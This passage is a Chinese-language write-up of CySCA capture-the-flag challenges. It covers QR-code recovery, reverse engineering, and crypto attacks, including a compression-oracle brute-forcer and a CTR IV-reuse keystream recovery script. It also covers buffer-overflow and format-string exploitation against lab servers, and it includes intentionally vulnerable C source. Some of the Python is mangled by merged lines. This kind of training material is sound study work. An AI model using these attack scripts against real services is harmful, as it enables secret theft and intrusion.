![image.png](https://image.3001.net/images/20190822/1566436279_5d5debb7608a8.png)  

第一步是从图像中提取二维码。photoshop技术在这里有帮助但可以通过手动将数据复制到29 x
29网格中轻松完成。在本文中我们使用Excel创建了一个29 x
29的网格。以下是从图像中手动提取后Excel中的二维码。(由于不想手动我直接拿官方解析好的图片)  

![image.png](https://image.3001.net/images/20190822/1566436567_5d5decd722cd3.png)正如你所看到的没有足够的信息让二维码阅读器解码这条信息并且有太多的数据丢失了无法进行错误修正来计算丢失的内容。因此我们必须重新插入足够的缺失信息这样一个二维码阅读器就可以使用二维码纠错来确定缺失信息。为了做到这一点我们可以先在我们的二维码中添加缺少的二维码的必需部分。首先最重要的是在右上角定位立方体。如果二维码上没有三个定位立方体那么二维码阅读器将不会读取二维码。  

![image.png](https://image.3001.net/images/20190822/1566436761_5d5ded99d8a5a.png)接下来我们将添加被破坏的时间和元数据位。幸运的是定时位总是相同的并且元数据位在二维码的两个位置上重复。下面的图表突出显示了这些部分。

![image.png](https://image.3001.net/images/20190822/1566436928_5d5dee407ce53.png)

    
    
    在这个图中每个带边框的颜色代表元数据的不同部分。
    ●橙色是计时位。这些总是在定位立方体的边缘之间交替打开/关闭。
    ●蓝色为格式错误修正位。
    ●绿色是面罩图案。这些信息告诉我们在二维码上使用了什么样的面具。
    ●红色为误差修正水平。这些信息告诉我们在生成这个二维码时使用了什么级别的错误修正。
    ●每个二维码上始终设置紫色。
    ●黄色是一个校准立方体。

具体的原理过程请参照[文章1](https://www.cnblogs.com/sddai/p/5675041.html)[文章2](https://cli.im/news/260)

![QRç V3](http://devloop.users.sourceforge.net/images/cysca/pattern_big.png)

  

如您所见元数据部分跨每个有色部分的两个不同位置进行镜像。这就是我们如何确定在丢失的部分中要设置哪些位的方法。此时您可以尝试使用二维码阅读器读取二维码但是二维码中没有足够的错误更正来弥补缺失的部件。所以我们需要尝试手动读取当生成一个二维码时它在数据位上应用了一个屏蔽元数据位就不会被屏蔽。所以要读取数据我们需要取消对其的屏蔽。为了确定使用了什么掩模我们需要查看掩模位。在这种情况下它是[黑色][黑色][白色]或110。****在下一页提供了这个方便的图片来帮助解码面具。

![image.png](https://image.3001.net/images/20190822/1566437522_5d5df0926e45c.png)如我们所见这个二维码上使用的屏蔽模式是行+列%3=0。如下所示。

![image.png](https://image.3001.net/images/20190822/1566437581_5d5df0cdbf45c.png)掩码应用程序是一个简单的异或操作。因此如果一个正方形是填充在掩模中的而在二维码中它是颠倒的否则它不会改变。我们将掩模应用到二维码中不包括原始图像中胶带隐藏的部分。这给了我们以下的二维码。

![image.png](https://image.3001.net/images/20190822/1566437700_5d5df1448602d.png)在二维码中数据从右下角开始存储。然后它从右到左以两列的形式上下移动。下面的图片来自****显示了数据存储在二维码中的方式。

![image.png](https://image.3001.net/images/20190822/1566437741_5d5df16dae51e.png)

此图像的右侧指示位的读取顺序。然而，这幅图像有点误导性，因为它没有考虑开始时的四个编码位或接下来的八个编码位的长度。

为了解释我们的二维码，我们需要知道数据的编码和长度。编码由从二维码右下角开始的前四位决定。在下一页的图片中，这些都是红色边框。长度由下一页图像中以紫色边界的下八位决定。![image.png](https://image.3001.net/images/20190822/1566437818_5d5df1ba922fe.png)

  

****有一个表格告诉我们每个编码方案是什么。当读取位时，右下角是最重要的，向上时从右向左读取。这给我们提供了0100，它查看的表是字节编码。

现在，为了读取长度，我们再次使用这八个位的右下角作为最重要的位。这给了我们0010
0000，即32。这是以字节为单位的，所以我们的字节编码字符串是32字节长。知道了这一点，我们可以根据****地图上的图案，从二维码中找出32个字符。下面显示的是我们的二维码，每个字符都以淡蓝色边框。

![image.png](https://image.3001.net/images/20190822/1566437905_5d5df211e7482.png)  

 **注意：我们映射的字符左边的位是错误更正位。我们不需要这些来读取字符。**

现在我们需要读字符。第一个和第二个字符没有被遮挡，所以我们可以阅读这些字符。第一个字符是01001000或72，作为十进制数。72在ASCII中是“H”，所以第一个字符是“H”。

第二个字符是00000000，在ASCII中为空。正如我们很快看到的，在突出显示的字符中，每秒钟字符都是一个空字符。这告诉我们这个字符串可能是Unicode。这一点很重要，因为我们现在知道每一个字节都应该是空的，这样我们就可以开始预测应该在模糊区域中的数据。

我们知道的下一个不被遮蔽且不为空的字符是第7个。此字符位于下一行，因此右上角将成为最重要的位，如本文前面的图表所示。解码这个字符会得到01101011或107。在ASCII中，这是一个“k”。

我们继续此过程以解码原始图像中未被遮挡的字符。完成此过程后，我们有一个具有此格式的Unicode字符串。

    
    
    H__kTh_P____t___
    

此字符串中的下划线表示在原始二维码中被隐藏的字符。

知道字符串是unicode，这是cysca中的标志格式，这是一个ctf，我们可以推断出密钥的开头很可能是“hacktheplanet”。

我们现在对多余的预测字符进行编码，并将它们放回我们的二维码中。经过这一过程，我们得到的二维码如下图所示。

![image.png](https://image.3001.net/images/20190822/1566438095_5d5df2cfe46cc.png)但是，我们仍然不知道钥匙末端的三个数字。希望我们现在已经预测了足够的数据，以便进行错误修正，为我们完成这一关键。所以我们把这个面具重新贴在二维码上。下图显示了之后的二维码。![image.png](https://image.3001.net/images/20190822/1566438132_5d5df2f43d228.png)  

现在我们可以把它装进一个二维码阅读器，如果你有幸拥有一个好的二维码阅读器，它可能已经能够读到这个并给你钥匙了（我们找到了一个可以读的）。

但是，如果没有，我们可以添加更多的数据。记得之前我们说过这是一个Unicode字符串。正如你在上面看到的，我们在数字应该出现的缺失区域仍然没有任何数据。如果每一个第二个字节都是空的，我们知道在应用了掩码之后，它看起来就像是一个掩码。在这一过程之后，我们将得到以下二维码。

![image.png](https://image.3001.net/images/20190822/1566438193_5d5df3319bba0.png)现在有足够的正确位，大多数二维码阅读器都可以进行纠错并获得密钥。用QR代码阅读器阅读上图，我们得到了“HakEthyPrime790”的密钥。  

# Reverse Engineering

## U JAD BRO?

    
    
    Telabad公司的员工忘记了他们的适当数据保护Java应用程序的密码。他们需要您检索存储在应用程序中的数据并提交它。

下载下来之后的jar文件，直接使用java运行，随便输入字符串就会发现程序会提示错误信息

![image.png](https://image.3001.net/images/20190822/1566438884_5d5df5e4323c1.png)通过jd-gui逆向，我们可以找到用户名和一串带符号字节数组形式的数字

![image.png](https://image.3001.net/images/20190822/1566439136_5d5df6e0a252d.png)

继续追踪，我们可以看到它有一串字符数组，然后将字符数组和获取用户名传到加密函数里面

![image.png](https://image.3001.net/images/20190822/1566443083_5d5e064b84e6c.png)在这里，我们看到用户名用作在一系列预定义字节上执行异或操作，下面用python获取结果

![image.png](https://image.3001.net/images/20190822/1566443174_5d5e06a6b1d2c.png)![image.png](https://image.3001.net/images/20190822/1566443223_5d5e06d75395e.png)番外，命令行的形式逆向

![image.png](https://image.3001.net/images/20190822/1566444175_5d5e0a8fc28ba.png)  

## Knock Knock

    
    
    Terrabad公司提供了一种二进制文件，他们认为这是安全领域的“下一件大事”。他们想把它作为一个安全的产品来认证。我们需要你对算法进行逆向工程来理解它的作用。完成此操作后，测试服务器将以192.168.0.104:3422运行，以证明您完全恢复了算法。

下载这个程序，我们首先查看它的基本信息，它是简单的linux x86二进制程序

![image.png](https://image.3001.net/images/20190822/1566443787_5d5e090b60a97.png)接着来看看它的调用了那些库

![image.png](https://image.3001.net/images/20190822/1566443926_5d5e09968b2e5.png)使用strings命令可以发现，它调用了上图几个函数进行权限操作，flag位于/flag.txt

    
    
    root@kali:~/Downloads# strings 488f866ad090d0843657f322e516168a-re02 
    /lib/ld-linux.so.2
    Y4!x
    __gmon_start__
    libc.so.6
    _IO_stdin_used
    setuid
    chroot
    socket
    exit
    htons
    fopen
    perror
    inet_ntoa
    signal
    puts
    fork
    __stack_chk_fail
    listen
    fgets
    send
    __errno_location
    bind
    chdir
    vsnprintf
    fclose
    setsockopt
    getgid
    alarm
    getuid
    fread
    waitpid
    accept
    setgid
    __libc_start_main
    write
    GLIBC_2.4
    GLIBC_2.1
    GLIBC_2.0
    PTRh 
    UWVS
    [^_]
    Currently running as user %d and group %d
    Moving into chroot jail for user %d. Path = '%s'
    /chroots/2011
    chroot failed: errno is %d
    chdir failed: errno is %d
    Changing group from %d to %d
    group change failed: errno is %d
    Changing user from %d to %d
    user change failed: errno is %d
    Forking....
    Fork failed. errno is %d
    Child process %d spawned. Original process quitting
    Port not in valid range 1025-65535
    Error creating listen socket
    Error binding to listen socket
    Error listening on listen socket
    Waiting for clients to connect on port %d
    Error accepting client connection on socket
    Connection on port %d from client %s
    /flag.txt
    Running portknockd
    FATAL ERROR opening socket
    FATAL ERROR on binding
    portknockd: New client connected
    FATAL ERROR: could not fork
    FATAL ERROR: could not accept connections
    portknockd: New Client. Waiting for knocks
    Failed writing to socket
    Failed reading from socket
    Failed writing flag to socket
    FATAL ERROR bad knock number
    FATAL ERROR opening socket
    FATAL ERROR on binding
    FATAL ERROR on accept
    /dev/urandom
    ERROR: Unable to open urandom
    ;*2$"
    GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
    .shstrtab
    .interp
    .note.ABI-tag
    .note.gnu.build-id
    .gnu.hash
    .dynsym
    .dynstr
    .gnu.version
    .gnu.version_r
    .rel.dyn
    .rel.plt
    .init
    .text
    .fini
    .rodata
    .eh_frame_hdr
    .eh_frame
    .ctors
    .dtors
    .jcr
    .dynamic
    .got
    .got.plt
    .data
    .bss
    .comment
      
    

接下来使用radare2进行逆向操作

  

<https://toastedcornflakes.github.io/articles/cysca_portknock.html>  

## Forever Alone

    
    
    Terribad公司丢失了一个旧应用程序的客户端组件，而该应用程序不再具有其源代码。他们希望您对所提供的服务器二进制文件进行反向工程，并构建一个客户端来与服务器交互。完成此操作后，服务器二进制文件将在192.168.0.104上运行，以测试客户端实现。
    

  

  

# Crypto

## Standard Galactic Alphabet

    
    
    对Fortcerts“Slightly Secure Shell”程序中使用的自定义加密执行白盒评估。 确定其实施中的任何漏洞，并证明可以利用这些漏洞获取机密信息。 服务器运行在192.168.0.104:12433

按照提示，首先我们先nc过去看看有什么信息给我们

![image.png](https://image.3001.net/images/20190822/1566446004_5d5e11b4b6871.png)

好像可以运行所有的命令，不过返回的都是加密信息  
![image.png](https://image.3001.net/images/20190822/1566446043_5d5e11db532b6.png)后面发现可以使用
**echo** 命令

![image.png](https://image.3001.net/images/20190822/1566447191_5d5e16579208a.png)  

看到A和B总是被相同的字符替换，我们可以看到它是单字母密码，我们可以看到在显示所有命令输出后密钥被重置。

我们可以配对两个bash命令来运行任意命令，在第一个我们回显明文字符串，在第二个我们运行我们的实际命令。 输出的第一行是密文字母，其余的是第二个命令输出。

我们通过回显简单的明文字母并回显测试字符串来测试这个想法。 然后我们可以使用密文来解码输出。 **简单来说，就是用已知明文和密文，对下面的命令进行解密**

![image.png](https://image.3001.net/images/20190822/1566447757_5d5e188dc12ee.png)
基本的字符

    
    
    echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.;
    

查看当前目录

    
    
    #>echo "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890./-";ls -al
    echo "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890./-";ls -alRunning command: 'echo "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890./-";ls -al'
    3w\*v_Z.h%PnNR~f:C^{i@bK;|j5V0M2$+(,Oyo79HU ]}Jxm<`LItAT>/?Q-E8z!
    {~{3nstQ
    *CbKC!KC!Ks/sEsEsTE-/so3CsITsstEITs8
    *CbKC!KC!Ks/sEsEsTE-/so3CsITsstEITs88
    *CbKC!KC!KstsEsEsTE-/so3CsI-sstEITswhR
    *CbKC!KC!KstsEsEsTE-/so3CsITsstEITs*v@
    *CbKC!KC!KstsEsEsTE-/so3CsITsstEITsv{\
    !Cb!C!!C!!sIsEsEssstEso3CsITsstEITs_n3Z8{K{
    *CbKC!KC!KsAsEsEsTE-/so3CsITsstEITsnhw
    
      
    

写了个脚本进行解密，可以看见虽然有些字符并没有解析到，不过并不影响结果，从结果来看，flag位于/flag.txt

![image.png](https://image.3001.net/images/20190822/1566450563_5d5e2383a49df.png)poc

    
    
    import sys
    
    
    mingwen = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890./-"miwen = """3w\*v_Z.h%PnNR~f:C^{i@bK;|j5V0M2$+(,Oyo79HU ]}Jxm<`LItAT>/?Q-E8z!"""t = {}
    
    if len(mingwen) != len(mingwen):
        print("明文跟密文长度不一致，请重新试试")
        sys.exit(0)
    
    cmd = """{~{3nstQ*CbKC!KC!Ks/sEsEsTE-/so3CsITsstEITs8*CbKC!KC!Ks/sEsEsTE-/so3CsITsstEITs88*CbKC!KC!KstsEsEsTE-/so3CsI-sstEITswhR*CbKC!KC!KstsEsEsTE-/so3CsITsstEITs*v@*CbKC!KC!KstsEsEsTE-/so3CsITsstEITsv{\!Cb!C!!C!!sIsEsEssstEso3CsITsstEITs_n3Z8{K{*CbKC!KC!KsAsEsEsTE-/so3CsITsstEITsnhw"""for i in range(len(mingwen)):
        t[miwen[i]] = mingwen[i]
    
    result = ""for i in cmd:
        if i == '\n':
            result = result + '\n'    else:
            try:
                result = result + t[i]
            except KeyError:
                result = result + "未知"print(result)

我们来查看flag.txt

![image.png](https://image.3001.net/images/20190822/1566450732_5d5e242c5a9e2.png)![image.png](https://image.3001.net/images/20190822/1566450806_5d5e247628383.png)![image.png](https://image.3001.net/images/20190822/1566450817_5d5e248164829.png)  

## Compression Session

    
    
    对Fortcerts高度安全的密钥生成服务器执行白盒评估。 识别并利用将导致泄露秘密数据的实施中的任何漏洞。 服务器运行在192.168.0.104:9999
    
    
    
    === snip... ===
    def compress(d):
    	c = zlib.compressobj()
    	return(c.compress(d) + c.flush(zlib.Z_SYNC_FLUSH)).encode("hex")
    
    def encrypt(aes,d):
    	return aes.encrypt(d).encode("hex")
    
    def handle_client(conn, addr):
    	AESKey = os.urandom(32)
    	ctr = Counter.new(128)
    
    	aes = AES.new(AESKey, AES.MODE_CTR, counter=ctr)
    
    	BANNER = "\t\tWelcome to the Keygen server.\n\t\t"
    	BANNER += "="*30
    	BANNER += "\n[+]All access is monitored and any unauthorised access will be treated as CRIME\n"
    	conn.send(BANNER)
    
    	SECRET = 'Key:' + helpers.load_flag()
    
    	data = conn.recv(2048).strip()
    
    	while len(data):
    		data = compress(SECRET + data)
    		data = encrypt(aes, data)
    
    		conn.send(data)
    
    		data = conn.recv(2048).strip()
    
    	conn.close()
    === snip... ===
    
    

我们首先分析挑战提供的源代码片段，我们看到服务器基本上只是接受我们的输入，将其加密压缩，然后将加密数据作为十六进制编码字符串返回。
它在CTR模式下使用AES，这意味着AES充当流密码而不是分组密码。

我们使用netcat连接到给定的远程服务。 我们会看到一个横幅，标识这是一个关键服务器，任何未经授权的访问都将被视为CRIME。
我们发现CRIME的大小写异常，此外服务器不提供用户与之交互的任何提示，也不提供任何帮助功能。

为了测试在查看源代码片段时我们对代码功能的评估是否有效，我们向服务器发送了许多输入。
从这些我们可以看到密钥没有在每次提交之间重置，但CTR模式中使用的计数器正在增加，因此加密数据不同。
我们还可以看到数据长度变化很小，表明正在使用流密码而不是分组密码。  

    
    
    root@kali:~/Downloads# ncat 192.168.0.104 9999
    		Welcome to the Keygen server.
    		==============================
    [+]All access is monitored and any unauthorised access will be treated as CRIME
    AAAA
    f678488b2a4484a82e7b2256476aff6f84a7348aa6eb356601201c84c73856df65eae980743fcd21235abf5eb9bdfb9a3530ed009a23219a533bfc25c21c1ac12f389b157790f45649107d8c
    
    BBBB
    1342b18d7c12eb6b6fca75f90844436c5a70136ca1b71b5f06694c0e33fbe2af258a0ea7ba75d487b23e706d5393a6a0e5625cd871e8246efee726a59cd182f1c3f40433f993d0cbef621cb1
    
    AAAAAAAA
    caba1b083bf9008cd577fae76089fa782c56e1b39036bb4c1e50c0af438a1e3de8f2aca208530b23024ae2fefcf1681567d63cb442bc5e3a2956e632c5b856a9c8bc0ddc0158ba3721ffa37bSAAFGSDGDFSGFDGF
    
    DGFDGFDGFDGFD
    400044c61db4157f57ecfec14912a8b65e071ca26275b3d2bd25678c476088ed3db3f0bdcbcf62f43540594cb840146929fd3e8047a65b85bd13818f7384a93ba163feb9d0a60a5c27f8c791cb4b4a2d570d5a41d6feb4a7e3e23477aa13cdd812d2b78a6506
    
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    0859dcb00f7a56634eb4d76567162bd9c4ace42e6298e4740af4a21803c35aa773dc4cf9371d5e3f9d9733d02b8c555b5d1ce561eae16865ab9eaefb4d2681b2d8c024ad3b2824ae1d4a9090
    
    AABB
    314894db4d938d2450de010c4a75ff2a6a46d03b007d16661f9a44fcd5fc1cf7bdd629dec03dcb93ee80d75488ea89452fea67867947d37dc246b720d0616289b70afa02f88f4b7a430d34b78998
    
    BBAA
    8108a4a9bfbfbc55ee594f58a2a81e9a7e150f3c32752b7155b6c0cc341742e88cee08c6207675152151babc97d8d4d9d069db9384d1aa051ca65dacbd74292dc378f3c142ce3fb8b244d1eee849
    
    

我们从输出中注意到，八个A加密的长度与四个A相同。 这似乎是不寻常的，直到我们意识到八个A通常会压缩到与四个A相同的长度。
使用流密码对压缩数据进行加密，因此加密数据的长度等于压缩数据的长度。 我们可以使用压缩数据的长度来泄漏有关被压缩数据的信息。
这与CRIME攻击的原理非常相似。  

在再次查看提供的代码之后，我们确定压缩数据的布局，如果我们假设标志是“TestFlag”并且我们提供服务器ABCD，则压缩数据将是“Key：TestFlagABCD”。
这些数据不能很好地压缩，我们会有更长的响应字符串。 但是，如果我们输入“Key：”作为输入，则要压缩的数据将是“Key：TestFlagKey：”。
当算法压缩这些数据时，它会注意到两个“Key：”实例并更有效地压缩它，从而缩短响应时间。

    
    
    SECRET = 'Key:' + helpers.load_flag()

为了测试我们的假设，我们发送服务器“Key：”。
每次我们发送它时，我们得到不同的响应内容，但是响应的长度没有改变。然后我们发送服务器“Key：A”并且响应的长度增加。
向服务器发送“密钥：B”和“密钥：C”给出了与“密钥：A”相同的响应长度。 当我们发送服务器“Key：D”时，响应更短，与我们发送“Key：”时的长度相同。

    
    
    root@kali:~/Downloads# ncat 192.168.0.104 9999
    		Welcome to the Keygen server.
    		==============================
    [+]All access is monitored and any unauthorised access will be treated as CRIME
    Key:
    2788e8764411d6552716fffaeefe94ab864f18f514be7660a1308d0b433cbb236e1ff68b412d481328a0377d614b65f5f91e98306eb81af869b02c87c50b194d82d5e71083b44917139a46a1
    
    Key:A
    474d97e3ac47c52a8d36e54de43ba2807cd93c6aa5439cbb3b0417895890b7d4a49b7b40fbc117926450c88e3ced51eb9256f001d79a599d32d883bc050c973b1ff9f5f6d361e0bcf0d80b9fbceb
    
    Key:B
    c220612df9434f28f8ccdde7d4950bedfc3593f7844eb682ac14fda921425e56caf3dda0ef1bbc29eade2c8c167780acb38afd453afcf7b5b1c2869abe24d9fd6ca3b95d6cc7a85a34c73b171d04
    
    Key:C
    65bd789184be3a38baba51f48a035dc5302d8f86b39936651273f4a16f1514dd9a179be194b0e66acefd9174e71395eaea72c7ba850359110152323cdcc9271ac2446acb272c64ad1364a18085f9
    
    Key:D
    c4ff51d66bdd052e6a2b934a5e6632a9a27408be8d718020a6b1aa7fb869983521b93a76301a1ea3d666230265fbd6502bc51c31a87491ea3e53efc270eb6fc893907e95d370d9264ec16eda
    
    

由此我们可以确定该标志可能是从大写字母D开始的。我们知道了这个弱点，然后我们编写了一个Python脚本，它将连接到服务器并逐个强制执行标志的每个字符。  

**先去获取已知密钥长度，再对比添加的时候，是不是少于或者等于已知密钥长度**

    
    
    import socket
    import string
    
    s = socket.socket()
    s.connect(("192.168.0.104",9999))
    s.recv(1024)
    
    key = "Key:"
    strings = string.ascii_letters+string.digits
    s.send(key)
    
    base_len = len(s.recv(9096))
    result = ""while True:
        for i in strings:
            s.send(key+result+i)
            recv_len = len(s.recv(9096))
            if recv_len <= base_len:
                result = result+i
        print(result)
    
    s.close()
    

![image.png](https://image.3001.net/images/20190822/1566452961_5d5e2ce18faeb.png)![image.png](https://image.3001.net/images/20190822/1566453022_5d5e2d1e42c61.png)  

## Chop Suey

    
    
    Fortcerts的高级职员表示反对使用白盒评估方法，其论点是“真正的攻击者无法访问源代码”。 对Fortcerts非常安全的加密服务进行黑盒评估。 诊断并识别可用于恢复加密数据的服务中的任何加密漏洞。 非常安全的加密服务运行在192.168.0.104:1337
    

由于没有为此问题提供文件，我们首先连接到加密服务，看看我们是否能够理解其功能。 我们收到一条消息说Key Key！
然后一个横幅告诉我们该程序使用非常安全的加密。 此外，它列出了两个命令，并告诉我们输出的格式。  

    
    
    root@kali:~/Downloads# nc 192.168.0.104 1337
    Key Reset!
        Welcome to the FortCerts Certified Data Encryption Service
                This program uses very secure encryption
    Commands:
    E - Encrypt specified data
    D - Dump service stored data
    Output is in format <IV>:<Encrypted Data>
    
    

我们尝试输入首次连接时列出的命令以尝试确定其功能。 当我们自己输入E时，我们无法使用加密，看起来这个命令除了需要E字符外还需要一个值。
当我们使用D命令时，我们得到一个看似加密的字符串，它与D命令旁边的help blurb匹配，另外我们收到一条消息，说明Key Reset！。  

![image.png](https://image.3001.net/images/20190822/1566453364_5d5e2e74a45db.png)  

我们尝试通过传入a到z和A到Z来确定是否存在任何未记录的命令，但除了E和D之外，我们得到消息Invalid Command并且我们从服务器断开连接。
我们尝试给D和E命令一些参数，看看他们的行为是否发生了变化。

无论我们给D添加什么额外输入，输出格式似乎保持不变，尽管字符串确实发生了变化。 加密数据和IV的长度也是不变的。
每次我们使用D命令时，我们都会收到密钥重置消息。

![image.png](https://image.3001.net/images/20190822/1566453496_5d5e2ef854532.png)接下来我们尝试使用E命令，似乎我们需要使用命令格式E，<value>，其他任何东西都会给我们一个无效的加密消息使用，并将使用消息返回给我们。
当我们向E提供值时，输出格式镜像D命令输出，因此D可能只是对存储在服务中的数据执行E命令。  

![image.png](https://image.3001.net/images/20190822/1566453632_5d5e2f80037c3.png)  

当我们使用E命令时，输出字符似乎都在十六进制范围09和af内，因此字符串很可能是十六进制编码字符。此外，我们看不到密钥重置消息，因此很有可能在每次使用E功能之间不重置密钥。

我们还意识到每个IV都是不同的，加密数据长度总是我们提供的数据长度的两倍。因为加密数据长度逐字逐渐增加，这使我们相信它是我们正在处理的流密码而不是分组密码。

我们阅读流密码和流密码攻击并读取WEP因为IV仅为24位大小而出现问题。我们在这里可以看到IV似乎只有2个十六进制编码字符或16位大小。可能我们可以获得重用的密钥和IV，这将导致密钥流的重用，允许我们解密从D命令返回的数据。让我们测试吧！

我们运行加密函数5次A
500次然后对结果进行排序并计算它们，我们最终得到三次IV碰撞，并且对于每次碰撞，响应数据都是相同的。这证实了该程序正在重用密钥和IV对，并且容易受到这种IV重用攻击。[攻击原理参照这里](https://crypto.stackexchange.com/questions/2991/why-must-iv-key-pairs-not-be-reused-in-ctr-mode)

![image.png](https://image.3001.net/images/20190822/1566454433_5d5e32a15a5da.png)

![image.png](https://image.3001.net/images/20190822/1566454409_5d5e3289a131b.png)  

现在我们已经确认服务器容易受到IV重用攻击，我们需要收集一些结果，以便我们可以恢复密钥流并解密服务存储数据。  

我们还需要记住，因为我们没有恢复密钥，只是密钥流，我们需要获得至少与D命令的输出一样多的响应字节。
为了找到长度，我们从D命令查看输出，并意识到我们需要至少22个字节的密钥流。  

我们将编写一个脚本来加密25个A并存储它们的结果，然后当我们有10000个唯一的IV时，我们将转储该标志并尝试解密它。  

    
    
    import socket
    clisock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clisock.connect(("172.16.1.20",1337))
    respdict = dict()
    #Recv Key Reset message and Bannerprint clisock.recv(1024)
    print clisock.recv(1024)
    while len(respdict) < 10000:
        #Send encrypt    clisock.send("E,"+"A"*25+"\n")
        resp = clisock.recv(1024).strip()
        parts = resp.split(":")
        respdict[parts[0]] = parts[1]
        #print parts    if len(respdict) % 200 == 0:
            print str(len(respdict))+"/10000"#Dump the service secretclisock.send("D\n")
    secretdata = clisock.recv(1024).strip()
    parts = secretdata.split(":")
    #Look for the IV in the dictif parts[0] in respdict:
        print "Found secret iv in dict. Dumping responses"    print " A's response:",respdict[parts[0]]
        print "Secret response:",parts[1]
    else:
        print "Didn't find secret iv in dict. Try again"
    

我们对服务器运行这个脚本，等待一段时间收集IV，然后我们收到一条消息，说明dump命令输出有一个存储在我们字典中的IV匹配。

![image.png](https://image.3001.net/images/20190822/1566456000_5d5e38c022a7f.png)  

现在我们对重用的密钥流做出了响应，我们首先需要恢复密钥流。 要做到这一点，我们需要记住，流密码生成一个密钥流，然后逐字节地对着明文进行xored以生成密文。
我们知道A的响应的明文，因此我们可以根据明文对响应数据进行xor以获得实际的密钥流。  

现在我们已经恢复了共享密钥流，我们可以使用它来解密转储命令响应并检索我们的标志FriendNoticeBelfast525。  

  

  

# Exploitation

## The Fonz

    
    
    对Quick Code Ltd.提供的源代码进行审核，以识别任何漏洞。 已设置服务器，以便您在192.168.0.104:20000利用已识别的客户漏洞
    
    
    
    === snip... ===
    void handle_client( int client_socket )
    {
        unsigned int FixedVariable = 0xFFFFFFFF;
        unsigned char DestBuffer[16] = {0};
        char secretKey[256];
        unsigned char socketBuffer[SOCKET_BUFFER_SIZE] = {0};
        size_t secretLength = 0;
        int retVal = 0;
    
        socket_printf( client_socket, "FixedVariable @ %#x. DestBuffer @ %#x\n", &FixedVariable, DestBuffer );
    
        socket_printf( client_socket, "Please enter text to write to buffer: " );
        retVal = read( client_socket, socketBuffer, SOCKET_BUFFER_SIZE );
    
        if( retVal <= 0 )
        {
            socket_printf( client_socket, "Error reading input %d.\n", retVal );
            return;
        }
    
        g_client_socket = client_socket;
        signal( SIGALRM, sigHandler );
        alarm(10);
    
        strncpy( DestBuffer, socketBuffer, MAX_WRITE_SIZE );
        
        socket_printf( client_socket, "Entered text: %s\n", DestBuffer );
        socket_printf( client_socket, "FixedVariable value: 0x%08X\n", FixedVariable );
        if( FixedVariable == 0x73696854 )
        {
            secretLength = load_flag( secretKey, sizeof(secretKey) );
            socket_printf( client_socket, "Congratulations! Secret key is: %s\n", secretKey );
        }
        else
        {
            socket_printf( client_socket, "Please set FixedVariable to 0x73696854\n" );
        }
        close( client_socket );
    }
    === snip... ===
    
    

我们首先查看提供的代码段。 我们将下面的行标识为可能存在漏洞。  

`strncpy( DestBuffer, socketBuffer, MAX_WRITE_SIZE );`  

这是缓冲区溢出的可能机会。 从代码片段中，我们可以看到DestBuffer数组长度为16个字符，并且我们将MAX_WRITE_SIZE字节复制到其中。
该片段未列出MAX_WRITE_SIZE的值，因此它可能大于16个字节，允许我们在堆栈上的DestBuffer之后溢出DestBuffer并覆盖变量。  

我们通过连接到游戏服务器并发送30个A作为我们的输入来快速测试我们的假设。  

![image.png](https://image.3001.net/images/20190822/1566460244_5d5e4954da5a0.png)我们从响应中看到，FixedVariable填充了0x41，这是A的ASCII值。看起来我们的A已经超越了DestBuffer并覆盖了FixedVariable.Now，我们知道我们可以通过溢出来控制FixedVariable，我们需要知道
我们的溢出字符串FixedVariable到底有多远。
有很多方法可以做到这一点，但是因为我们在溢出后告诉了FixedVariable的值，我们可以快速发送服务器唯一字符来确定确切的偏移量。  

![image.png](https://image.3001.net/images/20190822/1566460329_5d5e49a9b88aa.png)我们在FixedVariable中查找ASCII值，发现它们等于“TSRQ”。
您可能想知道为什么字符的顺序是相反的，这是由于服务器是X86而X86是一个小端架构。
这意味着它将dword寄存器与最低有效字节“first”存储在内存中。现在我们知道在我们的溢出字符串中，FixedVariable从Q字符开始。
我们可以通过用4321替换QRST来快速测试。  

![image.png](https://image.3001.net/images/20190822/1566460411_5d5e49fb9ed39.png)从服务器输出我们可以看到FixedVariable等于0x31323334。
这是我们期望的一个小端架构的ASCII字符“4321”，所以我们知道我们的溢出字符串中有正确的偏移量。  

0x73696853是字符串“sihT”的ascii表示。 我们需要记住服务器是littleendian所以我们需要反转我们的字节。
我们用“This”替换原始溢出字符串中的“QRST”。 然后，我们将溢出字符串发送到服务器并接收问题的标志。CombatBrownieSwell366。  

![image.png](https://image.3001.net/images/20190822/1566460512_5d5e4a6077df9.png)  

## "Matt Matt Matt Matt"

    
    
    对Quick Code Ltd.提供的源代码进行审核，以识别任何漏洞。 已设置服务器以利用客户192.168.0.104:20001的已识别漏洞  
    
    
    
    === snip...===
    #define RESP_PREFIX "Nice to meet you "
    #define RANDOM_RANGE 0xFFFFF
    void handle_client(int client_socket)
    {
        char* memBuf;
        int* pWinning;
        unsigned char socketBuffer[SOCKET_BUFFER_SIZE] = {0};
        char secretKey[256];
        size_t secretLength = 0;
        unsigned char destBuffer[MAX_LEN] = {0};
        int retVal = 0;
    
        g_client_socket = client_socket;
    
        memBuf = malloc(RANDOM_RANGE);
        if (memBuf == NULL)
        {
            socket_printf( client_socket, "ERROR: Unable to allocate memory.\n");
            return;
        }
    
        pWinning = memBuf + (GetRandomNumber() % (RANDOM_RANGE-4));
        *pWinning = 0x12345678;
        memBuf = NULL;
    
        while (1)
        {
            socket_printf( client_socket, "Hello, what is your name?\n" );
            retVal = read( client_socket, socketBuffer, SOCKET_BUFFER_SIZE );
            if( retVal <= 0 )
            {
                socket_printf( client_socket, "Error reading input %d.\n", retVal );
                return;
            }
    
            signal( SIGALRM, sigHandler );
            alarm(30);
    
            strcpy( destBuffer, RESP_PREFIX);
            snprintf( destBuffer+sizeof(RESP_PREFIX)-1, MAX_LEN-sizeof(RESP_PREFIX), socketBuffer );
            socket_printf( client_socket, "%s\n", destBuffer );
    
            if( *pWinning == 0x31337BEF )
            {
